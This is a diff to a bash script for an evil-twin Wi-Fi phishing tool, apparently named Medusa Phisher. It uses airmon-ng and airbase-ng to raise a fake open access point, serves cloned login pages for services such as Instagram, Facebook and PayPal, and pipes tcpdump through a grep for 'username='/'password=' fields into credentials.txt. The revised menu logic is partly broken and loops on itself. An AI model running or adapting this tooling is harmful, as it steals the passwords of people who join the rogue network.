@@ -16,15 +16,29 @@ big_welcome() {
     echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"
 }
 
-# Function to start the fake AP
-start_fake_ap() {
-    interface=$1
-    echo "Starting fake AP on interface: $interface"
-    # Set interface to monitor mode
-    airmon-ng start $interface > /dev/null 2>&1
-    # Start fake AP
-    airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 $interface &
-    echo "Fake AP started. Waiting for victims to connect..."
+# Function to display the menu for phishing options
+menu() {
+    echo -e "Select phishing method:"
+    echo "1. Online Phishing"
+    echo "2. Captive Portal Phishing"
+    read -p "Enter your choice: " choice
+    case $choice in
+        1) online_phishing ;;
+        2) captive_portal_phishing ;;
+        *) echo "Invalid choice. Please try again." ;;
+    esac
+}
+
+# Function for online phishing
+online_phishing() {
+    echo "Online Phishing selected."
+    # Implement online phishing logic here
+}
+
+# Function for captive portal phishing
+captive_portal_phishing() {
+    echo "Captive Portal Phishing selected."
+    menu
 }
 
 # Function to select network interface
@@ -34,7 +48,7 @@ select_interface() {
     select interface in $interfaces; do
         if [ -n "$interface" ]; then
             echo "Selected interface: $interface"
-            start_fake_ap "$interface"
+            start_captive_portal "$interface"
             break
         else
             echo "Invalid selection. Please try again."
@@ -42,72 +56,34 @@ select_interface() {
     done
 }
 
-# Function to select a phishing template
-select_template() {
-    echo "Select a phishing template:"
-    menu
+# Function to start captive portal phishing
+start_captive_portal() {
+    interface=$1
+    echo "Starting captive portal phishing on interface: $interface"
+    # Set interface to monitor mode
+    airmon-ng start $interface
+    # Start fake AP
+    airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 $interface &
+    sleep 5 # Wait for AP to start
+    serve_login_page "$server" "$interface"
 }
 
-# Function to use the selected template
-use_template() {
-    template=$1
-    # Copy selected template to the web server directory
-    cp "sites/$template" /var/www/html/login.php
-    echo "Using $template as the login template."
-}
-
-# Function for phishing menu
-menu() {
-    # ASCII art for "Medusa"
-    echo -e "\e[1;94m"
-    echo "                          __  __          _                   ____  _     _     _  "
-    echo "                         |  \/  | ___  __| |_   _ ___  __ _  |  _ \| |__ (_)___| |__   ___ _ __  "
-    echo "                         | |\/| |/ _ \/ _\`| | | / __|/ _\`| | |_) | '_ \| / __| '_ \ / _ \ '__| "
-    echo "                         | |  | |  __/ (_| | |_| \__ \ (_| | |  __/| | | | \__ \ | | |  __/ |  "  
-    echo "                         |_|  |_|\___|\__,_|\__,_|___/\__,_| |_|   |_| |_|_|___/_| |_|\___|_|  CODED BY: Adrilaw Github: https://github.com/Adrilaw"
-    echo -e "\e[1;33m"
-
-    # Print menu options
-    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m MEDUSA PHISHER  v1.0\e[0m\n"                                
-    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay   \e[0m                 \n"
-    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest   \e[0m             \n"
-    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;91m CryptoCurrency   \e[0m         \n"
-    printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;91m Verizon   \e[0m                \n"
-    printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;91m DropBox   \e[0m               \n"
-    printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;91m Adobe ID   \e[0m               \n"
-    printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;91m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;91m Shopify   \e[0m               \n"
-    printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;91m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;91m Messenger   \e[0m            \n"
-    printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;91m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;91m GitLab   \e[0m                 \n"
-    printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;91m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;91m Twitch   \e[0m                \n"
-    printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;91m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;91m MySpace   \e[0m               \n"
-    printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;91m Badoo   \e[0m                 \n"
-    printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m VK   \e[0m                     \n"
-    printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Yandex   \e[0m                 \n"
-    printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m            \n"
-
-    # Add the coded by line
-    printf "                                                \e[1;94m CODED BY: @Adrilaw  CREDIT TO FOR SITES TEMPLETE: https://github.com/8L4NK/blackeye/\e[0m\n"
-
-    read -p $'\n\e[1;92m➜ [\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option
-
-    if [[ $option == 33 ]]; then
-        server="create"
-        createpage
-        select_interface
-    elif (( $option >= 1 && $option <= 32 )); then
-        server=$(sed "${option}q;d" <<< "$serverlist")
-        use_template "$server"
-        select_interface
-    else
-        printf "\e[1;93m [!] Invalid option!\e[0m\n"
-        menu
-    fi
+# Function to serve login page
+serve_login_page() {
+    server=$1
+    interface=$2
+    echo "Serving login page for $server on interface: $interface"
+    cp "sites/$server/login.php" "/var/www/html/login.php"
+    cp "sites/$server/style.css" "/var/www/html/style.css"
+    cp "sites/$server/logo.png" "/var/www/html/logo.png"
+    cd /var/www/html
+    python3 -m http.server 80
 }
 
 # Function to capture credentials
 capture_credentials() {
     echo "Capturing credentials..."
-    tcpdump -i wlan0 -A -s0 port http or port https | egrep -i "username=|password=|user=|pass=|login=|usr=|pwd="
+    tcpdump -i wlan0 -A -s0 port http or port https | egrep -i "username=|password=|user=|pass=|login=|usr=|pwd=" > credentials.txt
 }
 
 # Main script starts here
@@ -122,17 +98,5 @@ big_welcome
 menu
 
 # Function to select network interface
-select_interface() {
-    echo "Select network interface:"
-    interfaces=$(ifconfig -a | grep -oE "^[a-zA-Z0-9]+" | grep -v "lo")
-    select interface in $interfaces; do
-        if [ -n "$interface" ]; then
-            echo "Selected interface: $interface"
-            start_fake_ap "$interface"
-            capture_credentials
-            break
-        else
-            echo "Invalid selection. Please try again."
-        fi
-    done
-}
+select_interface
+capture_credentials
